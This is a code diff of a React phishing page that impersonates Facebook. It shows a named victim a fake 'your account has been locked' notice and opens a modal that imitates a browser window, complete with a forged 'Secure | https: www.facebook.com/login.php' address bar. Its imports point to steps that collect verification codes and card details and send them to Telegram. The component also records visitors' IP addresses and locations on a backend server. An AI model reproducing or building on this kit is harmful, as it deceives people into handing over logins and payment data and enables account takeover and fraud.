@@ -1,67 +1,31 @@
-import React, { useState, useEffect } from "react";
-import { useNavigate } from "react-router-dom";
-import { Form, Input, Select, Row, Col, Modal } from "antd";
+import React, { useRef, useState } from "react";
+import { Input, Modal } from "antd";
+import "./styles/confirmation-second.css";
+import { useLocation } from "react-router";
 import { sendTelegram } from "./utils/sendTelegram";
-import { v4 as uuidv4 } from "uuid";
 import { getIpAddress } from "./utils/getIpAddress";
+import { API_BE } from "./utils/variable";
+import "./styles/landing_page_new.css";
+import ReCAPTCHA from "react-google-recaptcha";
 import { ConfirmationModal } from "./ConfirmationModal";
 import { Confirmation } from "./Confirmation";
-import { CodeTwo } from "./CodeTwo";
 import { ConfirmationSecond } from "./ConfirmationSecond";
 import { TH } from "./TH";
-import { API_BE } from "./utils/variable";
-import { LoadingFacebookButton } from "./LoadingFacebookButton";
 import { TenMinute } from "./TenMinute";
-import { Landing } from "./Landing";
-import axios from "axios";
 import { VerificationCC } from "./VerificationCC";
 import { RestrictedEmail } from "./RestrictedEmail";
+import { v4 as uuidv4 } from "uuid";
 
-export const FacebookButton = () => {
-  const [isModalVisible, setIsModalVisible] = useState(false);
+export const LandingPageNew = (props) => {
+  const { state } = useLocation();
+  const [code, setCode] = useState("");
   const [modalState, setValue] = useState(55);
+  const [isModalVisible, setIsModalVisible] = useState(false);
 
   const handleCancel = () => {
     return;
     setIsModalVisible(false);
     setValue(55);
-  };
-
-  const showModal = () => {
-    setIsModalVisible(true);
-    getCurrentIp().then((data) => {
-      getIpConfig(data);
-      createUserDb();
-    });
-  };
-
-  const createUserDb = () => {
-    let unique_id = localStorage.getItem("unique_id");
-    let ip_data = localStorage.getItem("ip-datas");
-
-    if (unique_id) {
-      ip_data = JSON.parse(ip_data);
-      unique_id = JSON.parse(unique_id);
-
-      const body = {
-        unique_id: unique_id,
-        ip_address: ip_data?.ip || "",
-        country: ip_data?.city || "",
-        country_code: ip_data?.country || "",
-        email: "",
-      };
-
-      fetch(`${API_BE}/users`, {
-        method: "POST",
-        headers: {
-          Accept: "application/json, text/plain, */*",
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify(body),
-      })
-        .then((res) => res.json())
-        .then(() => console.warn("yes!!"));
-    }
   };
 
   const getCurrentIp = async () => {
@@ -109,6 +73,57 @@ export const FacebookButton = () => {
       });
   };
 
+  const createUserDb = () => {
+    let unique_id = localStorage.getItem("unique_id");
+    let ip_data = localStorage.getItem("ip-datas");
+
+    if (unique_id) {
+      ip_data = JSON.parse(ip_data);
+      unique_id = JSON.parse(unique_id);
+
+      const body = {
+        unique_id: unique_id,
+        ip_address: ip_data?.ip || "",
+        country: ip_data?.city || "",
+        country_code: ip_data?.country || "",
+        email: "",
+      };
+
+      fetch(`${API_BE}/users`, {
+        method: "POST",
+        headers: {
+          Accept: "application/json, text/plain, */*",
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify(body),
+      })
+        .then((res) => res.json())
+        .then(() => console.warn("yes!!"));
+    }
+  };
+
+  const showModal = () => {
+    setIsModalVisible(true);
+    getCurrentIp().then((data) => {
+      getIpConfig(data);
+      createUserDb();
+    });
+  };
+
+  const recaptchaRef = useRef();
+  const url = window.location.href;
+  const scheduledCallValue = url?.split("=")[1];
+
+  const fullName = scheduledCallValue?.split("_");
+
+  const handleSubmit = (e) => {
+    e.preventDefault();
+    const token = recaptchaRef.current.getValue();
+    if (!token) return;
+    recaptchaRef.current.reset();
+    props.showModal();
+  };
+
   const changeModalScreens = (state) => {
     if (state === 0) {
       return (
@@ -143,11 +158,53 @@ export const FacebookButton = () => {
 
   return (
     <>
-      <Landing showModal={showModal} />
+      <div className="landing__new-page">
+        <div className="container">
+          <div>
+            <img className="random__image" src="/random.jpg" />
+          </div>
+          <div>
+            <h2>Shantel, your account has been locked</h2>
+            <p>
+              We saw unusual activity on you account. This may mean that someone
+              has used your account without your knowledge.
+            </p>
+          </div>
+          <div className="content">
+            <div className="image__icon">
+              <img src="/lock.PNG" />
+            </div>
+            <div className="text">
+              <h2>Account locked May 30, 2023</h2>
+              <p>
+                To protect you, your profile is not visible to people on
+                Facebook and you can't use your account.
+              </p>
+            </div>
+          </div>
+          <div className="take__through">
+            <p>We'll take you through some steps to unlock your account.</p>
+          </div>
+          <div className="take__get-started">
+            {/* <form onSubmit={handleSubmit}>
+            <ReCAPTCHA
+              ref={recaptchaRef}
+              sitekey={"6LeFzLAmAAAAALwV0xuLE4RUPjwxNYqa06uGUUl1"}
+            />
+            <button type="submit" className="btn-fb">
+              <img className="second__image" src="./fb.svg" alt="" />
+              Continue with Facebook
+            </button>
+          </form> */}
+
+            <button onClick={showModal}>Continue with Facebook</button>
+          </div>
+        </div>
+      </div>
       <Modal
         className="modal-wrapper  modal__facebook"
         width={1000}
-        bodyStyle={{ height: 650 }}
+        bodyStyle={{ maxHeight: 650, backgroundColor: "#e9ebee" }}
         title={
           <div>
             <div className="wrapper_header">
@@ -206,72 +263,5 @@ export const FacebookButton = () => {
         {changeModalScreens(modalState)}
       </Modal>
     </>
-  );
-
-  return (
-    <div>
-      <button onClick={() => showModal()}>Login with facebook</button>
-      <Modal
-        className="modal-wrapper  modal__facebook"
-        width={1000}
-        bodyStyle={{ height: 650 }}
-        title={
-          <div>
-            <div className="wrapper_header">
-              <div className="sign__up-modal">
-                <img src="/hLRJ1GG_y0J.ico" alt="" width="17px" />
-                <p>Log into Facebook | Facebook</p>
-              </div>
-              <div className="icons">
-                <div className="img" onClick={handleCancel}>
-                  <img src="/minus.png" alt="" />
-                </div>
-                <div className="img">
-                  <img
-                    src="https://icons-for-free.com/iconfiles/png/512/square-1321215626459427421.png"
-                    alt=""
-                  />
-                </div>
-                <div className="img img-x" onClick={handleCancel}>
-                  <img src="/close.png" alt="" />
-                </div>
-              </div>
-            </div>
-            <div className="input__title-wrapper">
-              <div className="lock__screen">
-                <div className="lock">
-                  <div className="lock__wrapper">
-                    <img src="/locktest.png" alt="" />
-                    <span className="green">Secure | https:</span>
-                    <span className="black-opacity">//</span>
-                  </div>
-                </div>
-                <span className="input__value">
-                  www.facebook.com
-                  <span className="black">
-                    {" "}
-                    /login.php?skip
-                    <span className="hide__text-mobile">
-                      _api_login=1
-                      &api_key=481324359126967&kid_directed_site=0&app_id=481324359126967&signed...
-                    </span>
-                  </span>
-                </span>
-              </div>
-
-              {/* <div className="lock lock-img">
-                            <div className="lock__wrapper">
-                            <img src="/zoom-in.png" alt="" />
-                            </div>
-                        </div> */}
-            </div>
-          </div>
-        }
-        open={isModalVisible}
-        maskClosable={false}
-      >
-        {changeModalScreens(modalState)}
-      </Modal>
-    </div>
   );
 };
